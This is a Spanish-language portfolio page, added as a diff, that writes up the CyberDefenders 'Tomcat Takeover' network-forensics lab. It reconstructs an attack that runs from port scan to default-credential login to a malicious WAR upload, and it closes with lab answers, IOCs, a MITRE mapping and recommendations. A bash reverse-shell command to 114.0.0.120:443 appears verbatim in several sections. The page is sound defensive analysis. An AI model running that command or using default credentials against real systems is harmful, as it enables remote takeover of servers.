@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CD-01 · Tomcat Takeover — José Corrales</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="icon" type="image/x-icon" href="../img/favicon.ico">
+    <link rel="stylesheet" href="../style.css">
+    <style>
+        .case-page { max-width: 860px; margin: 0 auto; padding: 48px 24px 80px; }
+        .back-link { display: inline-flex; align-items: center; gap: 8px; font-family: var(--font-mono); font-size: 0.8rem; color: var(--text); opacity: 0.6; margin-bottom: 40px; transition: all var(--transition); }
+        .back-link:hover { opacity: 1; color: var(--accent); }
+        .case-header { margin-bottom: 40px; }
+        .case-meta-row { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; margin-bottom: 16px; }
+        .case-id-label { font-family: var(--font-mono); font-size: 0.68rem; color: var(--accent); opacity: 0.7; letter-spacing: 0.1em; }
+        .case-badge { font-family: var(--font-mono); font-size: 0.65rem; padding: 2px 10px; border-radius: 20px; letter-spacing: 0.05em; }
+        .badge-tp { background: rgba(255,80,80,0.1); color: #ff6b6b; border: 1px solid rgba(255,80,80,0.2); }
+        .badge-closed { background: rgba(0,200,120,0.08); color: #00c878; border: 1px solid rgba(0,200,120,0.2); }
+        .badge-medium { background: rgba(255,165,0,0.1); color: #ffa500; border: 1px solid rgba(255,165,0,0.2); }
+        .case-header h1 { font-family: var(--font-display); font-size: clamp(1.6rem, 4vw, 2.2rem); font-weight: 800; color: var(--text-bright); letter-spacing: -0.03em; line-height: 1.2; margin-bottom: 12px; }
+        .case-header p.lead { font-size: 0.95rem; color: var(--text); line-height: 1.75; max-width: 680px; }
+        .info-bar { display: flex; flex-wrap: wrap; gap: 24px; padding: 18px 20px; background: var(--bg-2); border: 1px solid var(--border); border-radius: var(--radius); margin-bottom: 48px; }
+        .info-item { display: flex; flex-direction: column; gap: 3px; }
+        .info-label { font-family: var(--font-mono); font-size: 0.65rem; color: var(--accent); opacity: 0.6; letter-spacing: 0.08em; }
+        .info-value { font-family: var(--font-mono); font-size: 0.82rem; color: var(--text-2); }
+        .info-value.critical { color: #ff4444; }
+        .info-value.confirmed { color: #00c878; }
+        .case-section { margin-bottom: 48px; }
+        .case-section-title { font-family: var(--font-mono); font-size: 0.72rem; color: var(--accent); opacity: 0.6; letter-spacing: 0.1em; margin-bottom: 6px; }
+        .case-section h2 { font-family: var(--font-display); font-size: 1.15rem; font-weight: 700; color: var(--text-bright); margin-bottom: 20px; padding-bottom: 10px; border-bottom: 1px solid var(--border); }
+        .case-section p { font-size: 0.92rem; color: var(--text); line-height: 1.8; margin-bottom: 14px; }
+        .case-section ul { list-style: none; display: flex; flex-direction: column; gap: 8px; margin-bottom: 16px; }
+        .case-section ul li { font-size: 0.9rem; color: var(--text); padding-left: 18px; position: relative; line-height: 1.7; }
+        .case-section ul li::before { content: '▸'; position: absolute; left: 0; color: var(--accent); opacity: 0.5; font-family: var(--font-mono); font-size: 0.75rem; }
+        .evidence-grid { display: flex; flex-direction: column; gap: 2px; margin: 20px 0; background: var(--bg-2); border: 1px solid var(--border); border-radius: var(--radius); overflow: hidden; }
+        .ev-row { display: flex; border-bottom: 1px solid var(--border); }
+        .ev-row:last-child { border-bottom: none; }
+        .ev-key { font-family: var(--font-mono); font-size: 0.78rem; color: var(--accent); opacity: 0.7; padding: 10px 16px; min-width: 200px; background: rgba(0,0,0,0.15); border-right: 1px solid var(--border); }
+        .ev-val { font-family: var(--font-mono); font-size: 0.8rem; color: var(--text-2); padding: 10px 16px; flex: 1; word-break: break-all; }
+        .ev-val.danger { color: #ff6b6b; }
+        .ev-val.warn { color: #ffa500; }
+        .ev-val.ok { color: #00c878; }
+        .code-block { background: #050b12; border: 1px solid var(--border); border-left: 3px solid var(--accent); border-radius: var(--radius); padding: 16px 20px; margin: 16px 0; font-family: var(--font-mono); font-size: 0.78rem; color: var(--accent); overflow-x: auto; line-height: 1.9; word-break: break-all; }
+        .code-block .comment { color: var(--text); opacity: 0.4; }
+        .code-block .danger { color: #ff6b6b; }
+        .code-block .warn { color: #ffa500; }
+        .attack-timeline { display: flex; flex-direction: column; gap: 0; margin: 20px 0; position: relative; }
+        .attack-timeline::before { content: ''; position: absolute; left: 80px; top: 0; bottom: 0; width: 1px; background: var(--border); }
+        .tl-item { display: flex; gap: 20px; padding: 16px 0; }
+        .tl-time { font-family: var(--font-mono); font-size: 0.72rem; color: var(--text); opacity: 0.5; min-width: 72px; text-align: right; padding-top: 2px; }
+        .tl-dot-wrap { position: relative; display: flex; align-items: flex-start; padding-top: 6px; }
+        .tl-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--accent); opacity: 0.6; flex-shrink: 0; }
+        .tl-dot.high { background: #ff4444; opacity: 0.9; }
+        .tl-dot.warn { background: #ffa500; opacity: 0.8; }
+        .tl-content { flex: 1; padding-left: 8px; }
+        .tl-content strong { display: block; font-size: 0.9rem; color: var(--text-2); margin-bottom: 3px; }
+        .tl-content p { font-size: 0.84rem; color: var(--text); line-height: 1.6; margin-bottom: 0; }
+        .chain-block { background: #050b12; border: 1px solid var(--border); border-radius: var(--radius); padding: 20px 24px; margin: 20px 0; font-family: var(--font-mono); font-size: 0.8rem; line-height: 2.2; overflow-x: auto; }
+        .chain-arrow { color: var(--accent); opacity: 0.4; margin: 0 8px; }
+        .chain-step { color: var(--text-2); }
+        .chain-danger { color: #ff6b6b; }
+        .chain-warn { color: #ffa500; }
+        .chain-dim { color: var(--text); opacity: 0.4; font-size: 0.72rem; }
+        .ioc-grid { display: flex; flex-direction: column; gap: 10px; margin: 20px 0; }
+        .ioc-card { padding: 14px 18px; background: #050b12; border: 1px solid var(--border); border-radius: var(--radius); display: flex; gap: 14px; align-items: flex-start; }
+        .ioc-type { font-family: var(--font-mono); font-size: 0.65rem; color: var(--accent); opacity: 0.6; min-width: 70px; padding-top: 2px; letter-spacing: 0.05em; }
+        .ioc-content { flex: 1; }
+        .ioc-value { font-family: var(--font-mono); font-size: 0.82rem; color: #ff6b6b; word-break: break-all; margin-bottom: 3px; }
+        .ioc-desc { font-size: 0.8rem; color: var(--text); opacity: 0.7; }
+        .mitre-block { padding: 20px 24px; background: var(--bg-2); border: 1px solid var(--border); border-left: 3px solid var(--accent); border-radius: var(--radius); margin: 12px 0; }
+        .mitre-block .mitre-id { font-family: var(--font-mono); font-size: 1rem; color: var(--accent); font-weight: 700; margin-bottom: 4px; }
+        .mitre-block .mitre-name { font-size: 0.95rem; color: var(--text-bright); font-weight: 600; margin-bottom: 8px; }
+        .mitre-block p { font-size: 0.88rem; color: var(--text); line-height: 1.7; margin-bottom: 0; }
+        .mitre-tags { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 12px; }
+        .verdict-block { padding: 24px; background: rgba(255,68,68,0.04); border: 1px solid rgba(255,68,68,0.2); border-radius: var(--radius); margin: 20px 0; }
+        .verdict-block .verdict-label { font-family: var(--font-mono); font-size: 0.68rem; color: #ff4444; opacity: 0.8; letter-spacing: 0.1em; margin-bottom: 8px; }
+        .verdict-block p { font-size: 0.92rem; color: var(--text); line-height: 1.8; margin-bottom: 0; }
+        .lessons-grid { display: grid; grid-template-columns: 1fr; gap: 10px; margin: 20px 0; }
+        .lesson { padding: 16px 20px; background: var(--bg-card); border: 1px solid var(--border); border-left: 3px solid var(--accent); border-radius: var(--radius); }
+        .lesson p { font-size: 0.88rem; color: var(--text); line-height: 1.7; margin-bottom: 0; }
+        .lesson strong { color: var(--accent); }
+        .qa-grid { display: flex; flex-direction: column; gap: 8px; margin: 20px 0; }
+        .qa-item { display: flex; gap: 0; background: var(--bg-2); border: 1px solid var(--border); border-radius: var(--radius); overflow: hidden; }
+        .qa-q { font-family: var(--font-mono); font-size: 0.75rem; color: var(--accent); opacity: 0.6; padding: 12px 16px; min-width: 60px; background: rgba(0,0,0,0.15); border-right: 1px solid var(--border); display: flex; align-items: center; justify-content: center; }
+        .qa-content { padding: 12px 16px; flex: 1; }
+        .qa-question { font-size: 0.82rem; color: var(--text); opacity: 0.7; margin-bottom: 4px; line-height: 1.5; }
+        .qa-answer { font-family: var(--font-mono); font-size: 0.85rem; color: #00c878; }
+        @media (min-width: 600px) { .lessons-grid { grid-template-columns: 1fr 1fr; } }
+    </style>
+</head>
+<body>
+
+    <div class="scanlines" aria-hidden="true"></div>
+    <div class="noise" aria-hidden="true"></div>
+    <div class="cursor-glow" id="cursorGlow" aria-hidden="true"></div>
+
+    <div class="case-page">
+
+        <a href="../index.html#projects" class="back-link">
+            <i class="fas fa-arrow-left fa-xs"></i> Volver al portafolio
+        </a>
+
+        <header class="case-header">
+            <div class="case-meta-row">
+                <span class="case-id-label mono">// CD-01 · CyberDefenders</span>
+                <span class="case-badge badge-tp">Completado</span>
+                <span class="case-badge badge-closed">PCAP Analysis</span>
+                <span class="case-badge badge-medium">Medium</span>
+            </div>
+            <h1>Tomcat Takeover —<br>Análisis PCAP de Compromiso Apache Tomcat</h1>
+            <p class="lead">
+                Análisis de tráfico de red capturado durante un ataque contra un servidor Apache Tomcat 
+                en intranet corporativa. Reconstrucción completa del ataque desde el reconocimiento 
+                inicial hasta el establecimiento de una reverse shell persistente, usando exclusivamente 
+                análisis de PCAP con Wireshark.
+            </p>
+        </header>
+
+        <div class="info-bar">
+            <div class="info-item">
+                <span class="info-label">// plataforma</span>
+                <span class="info-value">CyberDefenders</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">// tipo</span>
+                <span class="info-value">PCAP Analysis</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">// herramienta</span>
+                <span class="info-value">Wireshark</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">// atacante</span>
+                <span class="info-value critical">114.0.0.120 · China</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">// resultado</span>
+                <span class="info-value confirmed">Servidor comprometido</span>
+            </div>
+        </div>
+
+        <!-- Resumen -->
+        <div class="case-section">
+            <p class="case-section-title">// 01_resumen</p>
+            <h2>Resumen ejecutivo</h2>
+            <p>
+                El análisis del PCAP reveló un ataque en cuatro fases bien definidas contra un servidor 
+                Apache Tomcat en la intranet corporativa. El atacante operó desde <strong>114.0.0.120 
+                (China)</strong> y ejecutó un ataque estructurado: reconocimiento con escaneo de puertos, 
+                enumeración de directorios con Gobuster, fuerza bruta de credenciales contra el panel 
+                de administración y finalmente despliegue de una webshell via archivo WAR malicioso.
+            </p>
+            <p>
+                El acceso al panel de administración se logró con credenciales por defecto 
+                (<strong>admin:tomcat</strong>), lo que facilitó la subida de <strong>JXQOZY.war</strong> 
+                — un archivo WAR malicioso que al desplegarse estableció una reverse shell hacia 
+                <strong>114.0.0.120:443</strong>, otorgando al atacante control total del servidor.
+            </p>
+
+            <div class="verdict-block">
+                <p class="verdict-label">// veredicto — servidor comprometido</p>
+                <p>
+                    <strong>Compromiso confirmado.</strong> Servidor Apache Tomcat comprometido mediante 
+                    credenciales por defecto y despliegue de webshell WAR. Reverse shell activa hacia C2 
+                    en China. Requiere aislamiento del servidor, cambio de credenciales, eliminación del 
+                    archivo WAR desplegado y revisión de otros sistemas en el mismo segmento.
+                </p>
+            </div>
+        </div>
+
+        <!-- Evidencia -->
+        <div class="case-section">
+            <p class="case-section-title">// 02_evidencia</p>
+            <h2>Hallazgos del análisis PCAP</h2>
+
+            <div class="evidence-grid">
+                <div class="ev-row">
+                    <span class="ev-key">IP atacante</span>
+                    <span class="ev-val danger">114.0.0.120 (China)</span>
+                </div>
+                <div class="ev-row">
+                    <span class="ev-key">Puerto panel admin</span>
+                    <span class="ev-val danger">8080 (Apache Tomcat Manager)</span>
+                </div>
+                <div class="ev-row">
+                    <span class="ev-key">Herramienta enumeración</span>
+                    <span class="ev-val danger">Gobuster</span>
+                </div>
+                <div class="ev-row">
+                    <span class="ev-key">Directorio descubierto</span>
+                    <span class="ev-val danger">/manager</span>
+                </div>
+                <div class="ev-row">
+                    <span class="ev-key">Credenciales usadas</span>
+                    <span class="ev-val danger">admin:tomcat (credenciales por defecto)</span>
+                </div>
+                <div class="ev-row">
+                    <span class="ev-key">Archivo malicioso</span>
+                    <span class="ev-val danger">JXQOZY.war</span>
+                </div>
+                <div class="ev-row">
+                    <span class="ev-key">Reverse shell</span>
+                    <span class="ev-val danger">/bin/bash -i &gt;&amp; /dev/tcp/114.0.0.120/443 0&gt;&amp;1</span>
+                </div>
+                <div class="ev-row">
+                    <span class="ev-key">Puerto C2</span>
+                    <span class="ev-val danger">443 (HTTPS — evasión de firewall)</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Cadena de ataque -->
+        <div class="case-section">
+            <p class="case-section-title">// 03_cadena</p>
+            <h2>Cadena de ataque reconstruida desde el PCAP</h2>
+
+            <div class="chain-block">
+                <div><span class="chain-danger">114.0.0.120</span> <span class="chain-dim">// atacante · China</span></div>
+                <div><span class="chain-arrow">▼</span> Fase 1: Escaneo de puertos</div>
+                <div><span class="chain-warn">Múltiples solicitudes en varios puertos</span> <span class="chain-dim">// reconocimiento · puerto 8080 identificado como Tomcat</span></div>
+                <div><span class="chain-arrow">▼</span> Fase 2: Enumeración de directorios</div>
+                <div><span class="chain-warn">Gobuster</span> <span class="chain-dim">// fuerza bruta de rutas · /manager descubierto</span></div>
+                <div><span class="chain-arrow">▼</span> Fase 3: Fuerza bruta de credenciales</div>
+                <div><span class="chain-warn">Múltiples intentos HTTP Basic Auth</span> <span class="chain-dim">// contra /manager</span></div>
+                <div><span class="chain-arrow">▼</span> Credenciales por defecto aceptadas</div>
+                <div><span class="chain-danger">admin:tomcat</span> <span class="chain-dim">// acceso al panel de administración confirmado</span></div>
+                <div><span class="chain-arrow">▼</span> Fase 4: Despliegue de webshell WAR</div>
+                <div><span class="chain-danger">JXQOZY.war</span> <span class="chain-dim">// subido via Tomcat Manager · desplegado automáticamente</span></div>
+                <div><span class="chain-arrow">▼</span> Reverse shell establecida</div>
+                <div><span class="chain-danger">/bin/bash -i &gt;&amp; /dev/tcp/114.0.0.120/443 0&gt;&amp;1</span></div>
+            </div>
+
+            <div class="code-block">
+                <span class="comment">// Comando de reverse shell identificado en el PCAP</span><br><br>
+                /bin/bash -c '<span class="danger">bash -i &gt;&amp; /dev/tcp/114.0.0.120/443 0&gt;&amp;1</span>'<br><br>
+                <span class="comment">// Análisis: bash interactivo redirigido a TCP hacia C2</span><br>
+                <span class="comment">// Puerto 443 usado para parecer tráfico HTTPS legítimo</span>
+            </div>
+        </div>
+
+        <!-- Timeline -->
+        <div class="case-section">
+            <p class="case-section-title">// 04_timeline</p>
+            <h2>Fases del ataque</h2>
+
+            <div class="attack-timeline">
+                <div class="tl-item">
+                    <span class="tl-time">Fase 1</span>
+                    <div class="tl-dot-wrap"><div class="tl-dot"></div></div>
+                    <div class="tl-content">
+                        <strong>Reconocimiento — Escaneo de puertos</strong>
+                        <p>114.0.0.120 genera solicitudes en múltiples puertos del servidor. El PCAP muestra el patrón característico de un escaneo — intentos secuenciales hacia distintos puertos. Puerto 8080 identificado como Apache Tomcat.</p>
+                    </div>
+                </div>
+                <div class="tl-item">
+                    <span class="tl-time">Fase 2</span>
+                    <div class="tl-dot-wrap"><div class="tl-dot warn"></div></div>
+                    <div class="tl-content">
+                        <strong>Enumeración — Gobuster en puerto 8080</strong>
+                        <p>Gobuster realiza fuerza bruta de directorios contra el servidor web. El User-Agent de Gobuster es visible en las cabeceras HTTP del PCAP. Directorio /manager descubierto — panel de administración de Tomcat.</p>
+                    </div>
+                </div>
+                <div class="tl-item">
+                    <span class="tl-time">Fase 3</span>
+                    <div class="tl-dot-wrap"><div class="tl-dot warn"></div></div>
+                    <div class="tl-content">
+                        <strong>Acceso — Fuerza bruta y credenciales por defecto</strong>
+                        <p>Múltiples intentos de autenticación HTTP Basic contra /manager. El atacante prueba combinaciones hasta dar con admin:tomcat — credenciales por defecto de Apache Tomcat que el administrador no cambió.</p>
+                    </div>
+                </div>
+                <div class="tl-item">
+                    <span class="tl-time">Fase 4</span>
+                    <div class="tl-dot-wrap"><div class="tl-dot high"></div></div>
+                    <div class="tl-content">
+                        <strong>Compromiso — Despliegue de WAR malicioso</strong>
+                        <p>JXQOZY.war subido via Tomcat Manager. Tomcat despliega automáticamente los archivos WAR — el malware queda activo como aplicación web. Reverse shell establecida hacia 114.0.0.120:443.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Q&A -->
+        <div class="case-section">
+            <p class="case-section-title">// 05_preguntas</p>
+            <h2>Respuestas al ejercicio</h2>
+            <p>Hallazgos identificados durante el análisis del PCAP respondiendo las preguntas del lab:</p>
+
+            <div class="qa-grid">
+                <div class="qa-item">
+                    <span class="qa-q">Q1</span>
+                    <div class="qa-content">
+                        <div class="qa-question">IP de origen responsable del escaneo</div>
+                        <div class="qa-answer">114.0.0.120</div>
+                    </div>
+                </div>
+                <div class="qa-item">
+                    <span class="qa-q">Q2</span>
+                    <div class="qa-content">
+                        <div class="qa-question">País de origen del atacante</div>
+                        <div class="qa-answer">China</div>
+                    </div>
+                </div>
+                <div class="qa-item">
+                    <span class="qa-q">Q3</span>
+                    <div class="qa-content">
+                        <div class="qa-question">Puerto del panel de administración</div>
+                        <div class="qa-answer">8080</div>
+                    </div>
+                </div>
+                <div class="qa-item">
+                    <span class="qa-q">Q4</span>
+                    <div class="qa-content">
+                        <div class="qa-question">Herramienta de enumeración de directorios</div>
+                        <div class="qa-answer">Gobuster</div>
+                    </div>
+                </div>
+                <div class="qa-item">
+                    <span class="qa-q">Q5</span>
+                    <div class="qa-content">
+                        <div class="qa-question">Directorio del panel de administración descubierto</div>
+                        <div class="qa-answer">/manager</div>
+                    </div>
+                </div>
+                <div class="qa-item">
+                    <span class="qa-q">Q6</span>
+                    <div class="qa-content">
+                        <div class="qa-question">Credenciales usadas para acceder al panel</div>
+                        <div class="qa-answer">admin:tomcat</div>
+                    </div>
+                </div>
+                <div class="qa-item">
+                    <span class="qa-q">Q7</span>
+                    <div class="qa-content">
+                        <div class="qa-question">Nombre del archivo malicioso subido</div>
+                        <div class="qa-answer">JXQOZY.war</div>
+                    </div>
+                </div>
+                <div class="qa-item">
+                    <span class="qa-q">Q8</span>
+                    <div class="qa-content">
+                        <div class="qa-question">Comando de reverse shell para persistencia</div>
+                        <div class="qa-answer">/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/114.0.0.120/443 0&gt;&amp;1'</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- IOCs -->
+        <div class="case-section">
+            <p class="case-section-title">// 06_iocs</p>
+            <h2>Indicadores de compromiso (IOCs)</h2>
+
+            <div class="ioc-grid">
+                <div class="ioc-card">
+                    <span class="ioc-type">IP</span>
+                    <div class="ioc-content">
+                        <div class="ioc-value">114.0.0.120</div>
+                        <div class="ioc-desc">IP atacante y C2 — China · origen del escaneo y destino de la reverse shell</div>
+                    </div>
+                </div>
+                <div class="ioc-card">
+                    <span class="ioc-type">ARCHIVO</span>
+                    <div class="ioc-content">
+                        <div class="ioc-value">JXQOZY.war</div>
+                        <div class="ioc-desc">Webshell WAR desplegada en Apache Tomcat via panel /manager</div>
+                    </div>
+                </div>
+                <div class="ioc-card">
+                    <span class="ioc-type">CREDENCIAL</span>
+                    <div class="ioc-content">
+                        <div class="ioc-value">admin:tomcat</div>
+                        <div class="ioc-desc">Credenciales por defecto de Tomcat — nunca fueron cambiadas</div>
+                    </div>
+                </div>
+                <div class="ioc-card">
+                    <span class="ioc-type">COMANDO</span>
+                    <div class="ioc-content">
+                        <div class="ioc-value">/bin/bash -i &gt;&amp; /dev/tcp/114.0.0.120/443 0&gt;&amp;1</div>
+                        <div class="ioc-desc">Reverse shell bash hacia C2 en puerto 443</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- MITRE -->
+        <div class="case-section">
+            <p class="case-section-title">// 07_mitre</p>
+            <h2>Mapeo MITRE ATT&CK</h2>
+
+            <div class="mitre-block">
+                <div class="mitre-id">T1595.001 — Active Scanning: Port Scanning</div>
+                <div class="mitre-name">Táctica: Reconnaissance</div>
+                <p>Escaneo activo de puertos contra el servidor objetivo para identificar servicios expuestos. Puerto 8080 identificado como Apache Tomcat.</p>
+                <div class="mitre-tags">
+                    <span class="tag">T1595.001</span>
+                    <span class="tag">Reconnaissance</span>
+                    <span class="tag">TA0043</span>
+                </div>
+            </div>
+
+            <div class="mitre-block">
+                <div class="mitre-id">T1190 — Exploit Public-Facing Application</div>
+                <div class="mitre-name">Táctica: Initial Access</div>
+                <p>Acceso al panel de administración de Tomcat mediante credenciales por defecto (admin:tomcat) tras enumeración de directorios con Gobuster.</p>
+                <div class="mitre-tags">
+                    <span class="tag">T1190</span>
+                    <span class="tag">Initial Access</span>
+                    <span class="tag">TA0001</span>
+                </div>
+            </div>
+
+            <div class="mitre-block">
+                <div class="mitre-id">T1505.003 — Web Shell</div>
+                <div class="mitre-name">Táctica: Persistence</div>
+                <p>Despliegue de JXQOZY.war como aplicación web maliciosa en Tomcat, proporcionando acceso persistente al servidor via HTTP.</p>
+                <div class="mitre-tags">
+                    <span class="tag">T1505.003</span>
+                    <span class="tag">Persistence</span>
+                    <span class="tag">TA0003</span>
+                </div>
+            </div>
+
+            <div class="mitre-block">
+                <div class="mitre-id">T1059.004 — Unix Shell</div>
+                <div class="mitre-name">Táctica: Execution</div>
+                <p>Reverse shell bash establecida hacia C2 usando redirección de TCP. Puerto 443 usado deliberadamente para camuflar el tráfico como HTTPS legítimo.</p>
+                <div class="mitre-tags">
+                    <span class="tag">T1059.004</span>
+                    <span class="tag">Execution</span>
+                    <span class="tag">TA0002</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Recomendaciones -->
+        <div class="case-section">
+            <p class="case-section-title">// 08_recomendaciones</p>
+            <h2>Recomendaciones</h2>
+            <ul>
+                <li><strong>Cambiar inmediatamente</strong> las credenciales por defecto de Tomcat — admin:tomcat es la primera combinación que cualquier atacante prueba</li>
+                <li><strong>Eliminar JXQOZY.war</strong> del servidor y auditar todos los archivos WAR desplegados buscando otros no autorizados</li>
+                <li><strong>Bloquear 114.0.0.120</strong> en firewall y cortar la conexión reverse shell activa en puerto 443</li>
+                <li><strong>Restringir acceso al panel /manager</strong> por IP — solo accesible desde redes administrativas autorizadas</li>
+                <li>Implementar <strong>autenticación de dos factores</strong> en el panel de administración de Tomcat</li>
+                <li><strong>Monitorear tráfico saliente en puerto 443</strong> hacia IPs desconocidas — patrón usado para camuflar reverse shells</li>
+                <li>Revisar si hay <strong>otros servidores Tomcat</strong> en la intranet con credenciales por defecto</li>
+            </ul>
+        </div>
+
+        <!-- Lecciones -->
+        <div class="case-section">
+            <p class="case-section-title">// 09_lecciones</p>
+            <h2>Lecciones aprendidas</h2>
+
+            <div class="lessons-grid">
+                <div class="lesson">
+                    <p><strong>Las credenciales por defecto son la puerta más fácil.</strong> admin:tomcat es ampliamente conocida y está en cualquier wordlist. Un servidor Tomcat expuesto con credenciales por defecto es equivalente a un servidor sin contraseña.</p>
+                </div>
+                <div class="lesson">
+                    <p><strong>El User-Agent delata las herramientas.</strong> Gobuster incluye su nombre en el User-Agent de las solicitudes HTTP. En el PCAP es inmediatamente visible. Los atacantes avanzados modifican el User-Agent — los automatizados no.</p>
+                </div>
+                <div class="lesson">
+                    <p><strong>Puerto 443 para reverse shells es evasión deliberada.</strong> Usar el puerto HTTPS estándar hace que el tráfico malicioso se mezcle con tráfico legítimo. La detección requiere inspección de contenido, no solo de puertos.</p>
+                </div>
+                <div class="lesson">
+                    <p><strong>El análisis de PCAP reconstruye el ataque completo.</strong> Sin acceso al endpoint, solo con el tráfico capturado fue posible identificar todas las fases del ataque, las herramientas usadas, las credenciales y el payload. Wireshark es fundamental en análisis forense de red.</p>
+                </div>
+            </div>
+        </div>
+
+        <footer>
+            <span class="mono dim">© 2026 José Corrales</span>
+            <span class="dim">·</span>
+            <span class="mono dim">CD-01 · Tomcat Takeover · CyberDefenders</span>
+        </footer>
+
+    </div>
+
+    <script>
+        const glow = document.getElementById('cursorGlow');
+        document.addEventListener('mousemove', e => {
+            glow.style.left = e.clientX + 'px';
+            glow.style.top = e.clientY + 'px';
+        });
+    </script>
+
+</body>
+</html>
